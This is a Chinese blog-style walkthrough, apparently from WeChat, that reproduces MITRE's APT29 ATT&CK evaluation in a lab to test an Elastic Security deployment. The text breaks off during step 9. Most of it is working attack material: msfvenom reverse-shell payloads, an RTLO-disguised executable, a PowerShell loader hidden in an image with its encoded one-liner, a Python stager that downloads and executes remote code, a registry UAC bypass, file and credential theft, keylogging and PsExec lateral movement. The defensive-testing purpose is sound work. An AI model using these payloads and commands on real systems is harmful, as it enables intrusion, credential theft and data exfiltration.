> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xKCzzuipcK-Br82PlcCAaA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UpC1JBnQVuXupufBSHGgnXqp2omLIXOhM7Y7Q4E2z7q8zBaqmickqmrA/640?wx_fmt=jpeg)

在搭建完 Elastic Security 的环境后，我们尝试复现 ATT&CK Evaluations 中 APT29 的评估过程，已验证我们所搭建的环境是否满足需求。以下内容主要从自 https://github.com/mitre-attack/attack-arsenal/，在本地复现过程中修改了部分内容。  

如果你有一套自认为还不错的 SOC 或 SIEM，不妨在你的真实环境中使用以下评估方法进行成熟度评估。看看对 ATT&CK 框架的覆盖度能达到百分之多少，是否还存在可以提高的防御环节。

评估环境准备
------

ATT&CK 给出的拓扑和系统要求。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UHopX6yuSxiam9lZcSBuPTURIxtE8cYWWVyKafHvCfZ8Qy1klWD6k5SQ/640?wx_fmt=png)

根据我们自己的 Lab 环境修改如下：

<table><thead><tr><td>IP</td><td>OS-Name</td><td>OS</td><td>备注</td></tr></thead><tbody><tr><td>10.0.0.101</td><td>PC</td><td>Windows10 with Office 2019</td><td><br></td></tr><tr><td>10.0.0.102</td><td>PC1</td><td>Windows10</td><td><br></td></tr><tr><td>10.0.0.103</td><td>PC2</td><td>Windows10</td><td><br></td></tr><tr><td>10.0.0.104</td><td>PC3</td><td>Windows10 with Office 2019</td><td><br></td></tr><tr><td>10.0.0.100</td><td>DC01</td><td>DC Windows Server 2019 Datacenter</td><td>apt.local</td></tr><tr><td>10.0.0.200</td><td>Team Server</td><td>Pupy/Metasploit/PoshC2</td><td>Kali</td></tr><tr><td>10.0.0.199</td><td>Redirector Server</td><td>Socat</td><td>Ubuntu18</td></tr></tbody></table>

受害者系统准备
-------

1. 安装一个 Windows Server 2019 Datacenter，一个 Windows10 Pro 1903，然后克隆虚拟机。重新打开每个虚拟机运行 Sysprep 重置系统信息。安装包：ed2k://|file|cn_windows_server_2019_x64_dvd_4de40f33.iso|5086887936|7DCDDD6B0C60A0D019B6A93D8F2B6D31|/ ed2k://|file|cn_windows_10_business_edition_version_1903_updated_june_2019_x64_dvd_830837d9.iso|5032351744|DFF5FF3B87D209D16ECE7543255FA573|/2. 修改计算机名、加入 apt.local 域 3. 新建 jack、john 两个域账户并添加到 Domain Admin 组，密码为 Passw0rd!4. 关闭自动更新，也可以加入域后通过组策略禁止更新。5. 使用 DefenderControl 关闭 Windows Defender。6. 开启 RDP，授予用户远程登陆权限。7. 通过域组策略将 UAC 设置为从不通知。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UxGFRr62uXDU42buvWbFDrDKIoRdUXAp64Mg6sYqvuqNKxJGyIBziaXQ/640?wx_fmt=png)8.  通过组策略修改注册表以允许存储明文凭据

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UkNKUoebc5MnxQHuRibnT7JuTydOnSBg5ibMm6sobnCkDUlefibpxkmckQ/640?wx_fmt=png)

> 参考：https://www.praetorian.com/blog/mitigating-mimikatz-wdigest-cleartext-credential-theft/?edition=2019

9.     使用 OfficeTools 部署 office 201910. 安装 Chrome 浏览器 11. 每个 PC 都开启 WinRM

```
Enable-PSRemoting -Force
Set-Service WinRM -StartMode Automatic
Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
Set-Item wsman:\localhost\Client\TrustedHosts -value 10.0.0.*
Get-Item WSMan:\localhost\Client\TrustedHosts
```

红队系统设置  

---------

### TeamServer

IP：10.0.0.200

1. 安装 Pupy （由于生成的 exe 无法正常工作，由 Metasploit 代替。）

```
sudo docker image pull cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892
sudo docker tag cyb3rward0g/docker-pupy:f8c829dd66449888ec3f4c7d086e607060bca892 docker-pupy
sudo docker run --rm -it -p 1234:1234 docker-pupy python pupysh.py
sudo docker run --rm -it -p 1234:1234 -v "/opt/payloads:/tmp/payloads" docker-pupy python pupysh.py
sudo docker run --rm -it -p 1234:1234 -v "/opt/attack-platform:/tmp/attack-platform" docker-pupy python pupysh.py
```

2. 安装 PoshC2

```
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash
sudo posh-project -n posh1
sudo posh-config
```

3. 克隆官方仓库 `git clone https://github.com/mitre-attack/attack-arsenal.git`4. 从 / var / www / webdav 提供的 WebDAV 共享服务

```
sudo apt install apache2
sudo mkdir /var/www/webdav
sudo chown -R www-data:www-data /var/www/
sudo a2enmod dav
sudo a2enmod dav_fs
sudo vim /etc/apache2/sites-available/000-default.conf
sudo systemctl restart apache2.service
```

> 参考：https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-14-04

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UZZuUg3zz4tYHc0pZRRDKBQLO9viaggTfpBgx9goMuXqPqZq6cbAfBrg/640?wx_fmt=png)

5. 将有效负载复制到 webdav 共享

```
sudo cp ~/day1/payloads/python.exe /var/www/webdav/ 
cd /var/www/webdav
sudo chown -R www-data:www-data python.exe
```

### Redirector

IP：10.0.0.199

1. 安装 Socat `Sudo apt install socat`2. 在 Redirector 上使用 Socat 设置端口转发： `sudo socat TCP-LISTEN:443,fork TCP:10.0.0.200:443 & sudo socat TCP-LISTEN:1234,fork TCP:10.0.0.200:1234 & sudo socat TCP-LISTEN:8443,fork TCP:10.0.0.200:8443 &`

第 1 天
-----

Payload 生成
----------

**关于红队有效载荷的说明** 请参阅 payload_configs.md，构建自己的 Payload。所有新生成的 payload 在~/payloads/day1 / 目录下。

**Payload1：cod.3aka3.scr** 

Pupy 错误太多，使用 metasploit 替代 `msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 -f exe LHOST=10.0.0.199 LPORT=1234 RC4PASSWORD=msf -o cod.3aka3.scr` 然后在 windows 平台重命名，参考 https://redcanary.com/blog/right-to-left-override/

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UOyNhjomx8qeCa3xgeeapRcNblcLajPugQlVns7jEyClnOIicvGZrJtA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UHnAjFZaYBWQr7fiblicroOg1jBa6puLsKlXwodeT8YHBWbwia2eAxGXiaw/640?wx_fmt=png)

**Payload2：Privilege Escalation Payload (monkey.png)**

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.199 LPORT=443 --format psh -o meterpreter.ps1`

在使用 Invoke-PSImage 合成图片和 payload(选择的图片像素一定要大于脚本字节，以一个像素存放一个字节，生成的 base64 编码后的值替换步骤三里的！)

```
Import-Module .\Invoke-PSImage.ps1
Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\1.jpg

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("C:\Users\jack\Desktop\monkey.png");$o=a Byte[] 3840;(0..1)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3643]))
# 修改图片路径

#Base64编码
$text='sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("C:\Users\jack\Downloads\monkey.png");$o=a Byte[] 3840;(0..1)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3643]))'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text))

cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AEEAZABkAC0AVAB5AHAAZQAgAC0AQQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AGEAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAoACIAQwA6AFwAVQBzAGUAcgBzAFwAagBhAGMAawBcAEQAbwB3AG4AbABvAGEAZABzAFwAbQBvAG4AawBlAHkALgBwAG4AZwAiACkAOwAkAG8APQBhACAAQgB5AHQAZQBbAF0AIAAzADgANAAwADsAKAAwAC4ALgAxACkAfAAlAHsAZgBvAHIAZQBhAGMAaAAoACQAeAAgAGkAbgAoADAALgAuADEAOQAxADkAKQApAHsAJABwAD0AJABnAC4ARwBlAHQAUABpAHgAZQBsACgAJAB4ACwAJABfACkAOwAkAG8AWwAkAF8AKgAxADkAMgAwACsAJAB4AF0APQAoAFsAbQBhAHQAaABdADoAOgBGAGwAbwBvAHIAKAAoACQAcAAuAEIALQBiAGEAbgBkADEANQApACoAMQA2ACkALQBiAG8AcgAoACQAcAAuAEcALQBiAGEAbgBkADEANQApACkAfQB9ADsAJABnAC4ARABpAHMAcABvAHMAZQAoACkAOwBJAEUAWAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAFsAMAAuAC4AMwA2ADQAMwBdACkAKQA=
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UIicxCWKRlVqN3OOFvdYLMzZyXrlAoGgvfeE3L4uZyGqeLicVcgz5ibpPg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UBVKZELOEGFtmeYxCabCkxIgwPsJjE9EwVJCt0FuGvfePsxR7pVlyLg/640?wx_fmt=png)

**Payload3：Persistence readme.txt** 

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.199 LPORT=443 --format psh-cmd` 生成的内容，替换 payloads/SysinternalsSuite/readme.txt 中 816 行的内容。  

**Payload4：javamtsup.exe** 

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.199 LPORT=443 -f exe-service -o javamtsup.exe`

**Payload5：python.exe** 

`msfvenom -p python/meterpreter/reverse_https LHOST=10.0.0.199 LPORT=8443 -o python.py` 编辑 python.py 文件，保留 base64 解码后的内容，添加 import imp

```
import zlib,base64,sys,imp
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
hs=[]
if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
    import ssl
    sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    sc.check_hostname=False
    sc.verify_mode=ssl.CERT_NONE
    hs.append(ul.HTTPSHandler(0,sc))
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(zlib.decompress(base64.b64decode(o.open('https://10.0.0.199:8443/6BvQGFrYcU7EadF9pFikEAwLkBa1sLGV6TWrXtvxZLd6Pm_-FeXhgEgxLQgfwo1dKoy5e8UIhG2D1EpXfP8l8kg6GuOAMd_chLdrpDQrTHahqBKkbu3hEM_g94kQW0FG2u05ezCs-_').read())))
```

在 Windows 中编译，必须使用 python3：`pyinstaller -F python.py` 

使用 Upx 压缩：`upx --brute python.exe`

**Payload 6：psvcersion.txt** 

需要提前修改 psvcersion.txt 中 webdav 信息。**脚本里安装 7zip4Powershell 会超时导致命令失败，所以应该提前在受害者系统中安装 7zip4Powershell。可能需要翻墙。删除 psvcersion.txt 第 231 行。**

设置攻击平台，相关文件在~/payloads/day1 / 文件夹下：

1. 从以下网址下载 Chrome 密码转储工具：https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe2. 从以下位置下载 SysInternals zip 文件夹：https://download.sysinternals.com/files/SysinternalsSuite.zip3. 解压 SysinternalsSuite.zip; 将以下文件复制到 SysInternalsSuite 目录中：a) readme.txt b) psversion.txt(修改 webdav 配置) c) chrome-passwords.exe（重命名为 accessChk.exe） d) strings64.exe（从 hostui.cpp 编译）4. 压缩修改的 SysinternalsSuite 文件夹

受害者设置
-----

对于 2 个受害工作站：

1. 以具有管理员权限的用户身份登录。2.PC 安装英语并作为显示语言。3. 验证用户在 C:\Windows\Temp 目录中具有读 / 写 / 执行权限 4. 安装 7Zip4Powershell ，Powershell > `Install-Module -Name 7Zip4Powershell -Force`5. 导入证书 payloads/day1/shockwave.local.pfx，使用 PowerShell 导入证书：`Import-PfxCertificate -Exportable -FilePath "shockwave.local.pfx" -CertStoreLocation Cert:\LocalMachine\My`

开始
--

**添加 RTLO 字符并将 rcs.3aka3.doc 放置在受害者桌面上。**

### Step 1 – 初始违规

最初的违规行为是合法用户单击（T1204）伪装成良性单词文档的可执行有效载荷（屏幕保护程序可执行文件）（T1036）。一旦执行，有效负载就使用 RC4 密码在端口 1234（T1065）上创建 C2 连接。然后，攻击者使用活动的 C2 连接生成交互式 cmd.exe（T1059）和 powershell.exe（T1086）Shell。

**1.A** 

TeamServer： `$ sudo msfconsole`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UA8vIT52aiaUjqQ84SK73l9OefaGxkOtDqPntTuyZrcOibhygEz09lLIA/640?wx_fmt=png)

**使用 APT\jack 登录到 PC。双击桌面的 3aka3.doc。这会将反向外壳发送到 TeamServer 服务器。**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6U6fIicLBJ4RfFHXZSrgg8x6MDLssnbZFz9orPFxC7GCPbIL8wdyzNictQ/640?wx_fmt=png)

**1.B** 

meterpreter > `shell` 

C:\Users\jack\Desktop>`powershell` 

PS C:\Users\jack\Desktop>  

### Step 2 - 快速收集和渗出

攻击者运行单行命令，以搜索文件系统中的文档和媒体文件（T1083，T1119），收集（T1005）并将内容压缩（T1002）为单个文件（T1074）。然后通过现有的 C2 连接来提取文件（T1041）。

**2.A** 

PS >`$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*jack*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force`

PS C:\Users\jack\Desktop> `exit` 

C:\Users\jack\Desktop>`exit` 

meterpreter >

**2.B** 

meterpreter > `download "c:\Users\jack\AppData\Roaming\Draft.zip" .` 

**成功下载到 TeamServer 服务器。**

### Step 3 – 部署 Stealth 工具包

攻击者现在向受害者上载新的有效载荷（T1105）。有效负载是带有隐藏 PowerShell 脚本（T1027）的合法形成的图像文件。然后，攻击者通过用户帐户控制（UAC）旁路（T1122，T1088）提升特权，该旁路执行新添加的有效负载。使用 HTTPS 协议（T1071，T1032）在端口 443（T1043）上建立了新的 C2 连接。最后，攻击者从注册表中删除特权升级的工件（T1112）。

**3.A** 

**新建一个终端运行 msfconsole** 

[msf] >`handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https` 

**在上一个 meterpreter shell 中，将 monkey.png 上传到目标：** 

meterpreter >`upload /home/kali/payloads/day1/monkey.png "C:\Users\jack\Downloads\monkey.png"` 

meterpreter>`shell` 

meterpreter > `powershell` 

meterpreter (PS C:\Users\jack\Desktop)>

**3.B** 

meterpreter (PS C:\Users\jack\Desktop)> `New-Item -Path HKCU:\Software\Classes -Name Folder -Force;` 

meterpreter (PS C:\Users\jack\Desktop)>`New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;` 

meterpreter (PS C:\Users\jack\Desktop)>`New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;` 

meterpreter (PS C:\Users\jack\Desktop)>`New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;` 

meterpreter (PS C:\Users\jack\Desktop)> `Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"` 

当提示您输入值时，粘贴以下 1-liner： `powershell.exe -noni -noexit -ep bypass -window hidden -ec cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AEEAZABkAC0AVAB5AHAAZQAgAC0AQQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AGEAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAoACIAQwA6AFwAVQBzAGUAcgBzAFwAagBhAGMAawBcAEQAbwB3AG4AbABvAGEAZABzAFwAbQBvAG4AawBlAHkALgBwAG4AZwAiACkAOwAkAG8APQBhACAAQgB5AHQAZQBbAF0AIAAzADgANAAwADsAKAAwAC4ALgAxACkAfAAlAHsAZgBvAHIAZQBhAGMAaAAoACQAeAAgAGkAbgAoADAALgAuADEAOQAxADkAKQApAHsAJABwAD0AJABnAC4ARwBlAHQAUABpAHgAZQBsACgAJAB4ACwAJABfACkAOwAkAG8AWwAkAF8AKgAxADkAMgAwACsAJAB4AF0APQAoAFsAbQBhAHQAaABdADoAOgBGAGwAbwBvAHIAKAAoACQAcAAuAEIALQBiAGEAbgBkADEANQApACoAMQA2ACkALQBiAG8AcgAoACQAcAAuAEcALQBiAGEAbgBkADEANQApACkAfQB9ADsAJABnAC4ARABpAHMAcABvAHMAZQAoACkAOwBJAEUAWAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAFsAMAAuAC4AMwA2ADQAMwBdACkAKQA=`

meterpreter (PS C:\Users\jack\Desktop)> `Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force` 

**当提示您输入值时，请按：[Enter]**

**查看是否正确：** 

`Get-item -Path "HKCU:\Software\Classes\Folder\shell\open\command"`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Unicy1vV89AOib0WlYfZ4Lx3ez8VLDCL9VZ10UrHfGkKYdDMicQ5TVia9JA/640?wx_fmt=png)

meterpreter (PS C:\Users\jack\Desktop)> `exit` 

C:\Users\jack\Desktop> `%windir%\system32\sdclt.exe` 

**获得一个高权限的 Meterpreter 会话。**  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UbGYR2eLAg6iaVfibs7ww90RNiaut5abm7suqeb1LsWQwd9y2RGSV8YnLw/640?wx_fmt=png)

**3.C** 

C:\Users\jack\Desktop> `powershell` 

PS C:\Users\jack\Desktop> `Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force` 

PS C:\Users\jack\Desktop>`exit` 

[meterpreter (CMD)] >`exit`  

### Step 4 – 防御逃避与发现

攻击者在产生交互式 powershell.exe shell（T1086）之前，通过新的提升的访问权限上载了其他工具（T1105）。附加工具已解压缩（T1140），并放置在目标上以便使用。然后，攻击者枚举正在运行的进程（T1057）终止步骤 1 初始访问的进程，然后删除与该访问相关的各种文件（T1107）。最后，攻击者启动一个 PowerShell 脚本，该脚本执行各种侦察命令（T1083，T1033，T1082，T1016，T1057，T1063，T1069），其中一些是通过访问 Windows API（T1106）完成的。

**4.A** 

**第二个终端的 msfconsole** 

[msf] > `sessions -i 1` 

[meterpreter] > `upload /home/kali/payloads/day1/SysinternalsSuite.zip "C:\\Users\\jack\\Downloads\\SysinternalsSuite.zip"` 

[meterpreter] > `execute -f powershell.exe -i -H` 

PS C:\Program Files\SysinternalsSuite> `Expand-Archive -LiteralPath "C:\\Users\\jack\\Downloads\\SysinternalsSuite.zip" -DestinationPath "C:\\Users\\jack\\Downloads\\"`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UgdozaAzibicAL7J9NuPvDr7SbU4MmKb0iaZ3fa2t3MJyxTAwqKCKj3ROQ/640?wx_fmt=png)

PS C:\Users\jack\Desktop> `if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path C:\\Users\\jack\\Downloads\\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }` 

PS C:\Users\jack\Desktop> `cd "C:\Program Files\SysinternalsSuite\"`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UTsguLeXEF1mj1Oniafz9NL65UwO50eDGdticiaJFMulqMHUB0xImczjSg/640?wx_fmt=png)

**4.B** PS C:\Program Files\SysinternalsSuite> `Get-Process`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6U4Rl6bLA7EjAyAe7Scs6nSlPQrZIA38hVXhTS9oXwOpXwS44CvBZtqA/640?wx_fmt=png)

PS C:\Program Files\SysinternalsSuite> `Stop-Process -Id 4224 -Force` 

**第一个终端的 rc4 会话关闭。** 

PS C:\Program Files\SysinternalsSuite> `Gci $env:userprofile\Desktop`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UadJ0BnEanarpeXK6BqiaZdJqc2Rh7icLd0ibyFqGFmqOyiatAtj9NaAYqA/640?wx_fmt=png)

PS C:\Program Files\SysinternalsSuite> `.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\?cod.3aka3.scr"` 

PS C:\Program Files\SysinternalsSuite> `.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"` 

PS C:\Program Files\SysinternalsSuite>`.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"` 

PS C:\Program Files\SysinternalsSuite> `Move-Item .\readme.txt readme.ps1` 

PS C:\Program Files\SysinternalsSuite>`. .\readme.ps1`

**4.C** 

PS C:\Program Files\SysinternalsSuite> `Invoke-Discovery`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UVkQ5Q8QlxO8umKlLor16N8Ja6w65ad5cB8egibJnykWXtjK3Odx6pjQ/640?wx_fmt=png)

### Step 5 – 持久性  

攻击者通过创建新服务（T1050）和在 Windows 启动文件夹（T1060）中创建恶意有效负载，建立了两种不同的持久访问受害者的方法。

**5.A** 

PS C:\Program Files\SysinternalsSuite> `Invoke-Persistence -PersistStep 1`

**5.B** 

PS C:\Program Files\SysinternalsSuite> `Invoke-Persistence -PersistStep 2`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UfeVUEyheyWoDArs8aOoWKIHoAqsDbCWwIdnxKJlib4lM9Zoh7QlKC8g/640?wx_fmt=png)

### Step 6 - 凭证访问  

攻击者使用重命名为伪装成合法实用工具（T1036）的工具访问存储在本地 Web 浏览器（T1081，T1003）中的凭据。然后，攻击者会收获私钥（T1145）和密码哈希（T1003）。

**6.A** 

PS C:\Program Files\SysinternalsSuite> `& "C:\Program Files\SysinternalsSuite\accesschk.exe"`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UGClVHje1aaICnpIr0EBN5n2Dl7aOjhkWacMslU3GX02JoN4WveRB2g/640?wx_fmt=png)

**6.B** PS C:\Program Files\SysinternalsSuite> `Get-PrivateKeys`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UXByYNa5xhiazv5RlyP2tIjsDLCKFcB6cugxLHN2NWM717C277qVPGbQ/640?wx_fmt=png)

PS C:\Program Files\SysinternalsSuite> `exit`  

**6.C** 

[meterpreter] >`run post/windows/gather/credentials/credential_collector`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UPJ6jeSicmPznef0kRGfjPxicQJevQy8VJHZRWiaUlToCIDF8FIqxibcGpA/640?wx_fmt=png)

### Step 7 - 收集和渗出  

攻击者收集屏幕截图（T1113），来自用户剪贴板的数据（T1115）和键盘记录（T1056）。然后，攻击者收集文件（T1005），将其压缩（T1002）和加密（T1022），然后再将其上传至攻击者控制的 WebDAV 共享（T1048）。

**7.A** 

[meterpreter] >`execute -f powershell.exe -i -H` 

PS C:\Program Files\SysinternalsSuite> `cd "C:\Program Files\SysinternalsSuite"` 

PS C:\Program Files\SysinternalsSuite> `Move-Item .\psversion.txt psversion.ps1` 

PS C:\Program Files\SysinternalsSuite>`. .\psversion.ps1` 

PS C:\Program Files\SysinternalsSuite> `Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UO5bbstnTRPSXoYicmrDdGcWEKgOBz4uQlVKDJsPCViaWHnPrBl8CRZ9w/640?wx_fmt=png)

**键入文本并复制到剪贴板。** 

PS C:\Program Files\SysinternalsSuite>`Get-Clipboard`  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Uqd2mCJcOQcoSibgMnoVBiaS1XKOscs6rEf5RiaBhV2Fequ8rxJ7ePhhqg/640?wx_fmt=png)

PS C:\Program Files\SysinternalsSuite> `Keystroke-Check` 

PS C:\Program Files\SysinternalsSuite>`Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"`  

**在受害者系统中，输入击键。** 

PS C:\Program Files\SysinternalsSuite> `View-Job -JobName "Keystrokes"` 

PS C:\Program Files\SysinternalsSuite>`Remove-Job -Name "Keystrokes" -Force` 

PS C:\Program Files\SysinternalsSuite>`Remove-Job -Name "Screenshot" -Force`

**7.B** 

PS C:\Program Files\SysinternalsSuite>`Invoke-Exfil`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6Uew1sqsDjXs7ibERT91KWHJClq6A1GRC3F4vGsgJRnANE2e57VMuHQ1Q/640?wx_fmt=png)

**注意如果失败，请检查事都按照 Payload 生成中 payload6 描述的方式进行修改。手动安装 7Zip4Powershell，脚本里会超时。这一步可以提前增加到环境准备里。**  

### Step 8 - 横向运动

攻击者在创建与第二受害者的远程 PowerShell 会话之前，使用轻型目录访问协议（LDAP）查询来枚举域中的其他主机（T1018）。通过此连接，攻击者枚举了正在运行的进程（T1057）。接下来，攻击者将新的 UPX 打包有效负载（T1045，T1105）上载到第二受害者。通过先前使用的凭证（T1078）通过 PSExec 实用程序（T1077，T1035）在第二受害者上执行此新的有效负载。

**8.A** 

**切换至 Meterpreter shell:** 

PS C:\Program Files\SysinternalsSuite> `Ad-Search Computer Name *` 

PS C:\Program Files\SysinternalsSuite>`Invoke-Command -ComputerName PC1 -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId` 

这里要写主机名，而不是 IP。需要提前远程桌面到第二受害者，因为需要一个非 0 的 session 提供横向移动。注意步骤 8C 的会话 ID。

**8.B** 

**新建一个终端启动 msfconsole** 

[msf] > `handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https` 

**回到当前 Meterpreter session:** 

PS C:\Program Files\SysinternalsSuite>`Invoke-SeaDukeStage -ComputerName PC1`

**8.C** 

**通过 PSEXEC 远程执行 python.exe** 

PS C:\Program Files\SysinternalsSuite>`.\PsExec64.exe -accepteula \\PC1 -u "apt.local\jack" -p "Passw0rd!" -i 5 "C:\Windows\Temp\python.exe"`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UnRWCgwNIojTSVFJMJ0jiaMX6glMhEuJ6Zgx0zRTxSDoORGIwHicZeTiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UVFOPdOWWnIOCfQb5iaDXnlK7IZicCjzwsVkrib9u1icCbtvX7N6Ndf6bgw/640?wx_fmt=png)

**获得一个 meterpreter 会话。**  

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQjWqvfCJX7U7bqZAaSZY6UXSQhZhDfGuhx2rFqssAURZUnr6ibCECsJEUOOashgNRvMjibVgIfE4mg/640?wx_fmt=png)

### Step 9 – 收集  

攻击者在运行 PowerShell 单线命令（T1086）之前搜索其他文件（T1083，T1119），然后将其实用程序上载到第二受害者（T1105）。收集感兴趣的文件（T1005），然后加密（T1022）并压缩（T1002）为单个文件（T1074）。然后，该文件通过现有的 C2 连接进行窃听（T1041）。最后，攻击者删除与该访问关联的各种文件（T1107）。

**9.A** 

**进入 meterpreter python 会话** 

[msf] > `sessions` 

[msf] >`sessions -i 1` 

